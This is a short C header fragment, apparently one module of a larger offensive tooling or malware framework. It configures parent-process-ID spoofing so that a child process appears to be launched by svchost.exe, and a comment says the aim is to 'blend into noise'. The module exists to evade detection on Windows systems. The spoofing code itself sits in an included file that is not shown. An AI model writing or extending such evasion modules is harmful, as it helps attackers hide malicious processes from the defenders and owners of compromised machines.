// chunk: process/ppid_spoof_svchost
// depends: (none)
// provides: spoof_ppid_create_process, ppid_spoof_auto
// headers: windows.h,tlhelp32.h
// note: Create child process with spoofed parent (svchost.exe) — most common Windows process, blends into noise

#ifndef CHUNK_PPID_SPOOF_SVCHOST
#define CHUNK_PPID_SPOOF_SVCHOST

#define PPID_TARGET "svchost.exe"

#include "ppid_spoof.c"

#endif
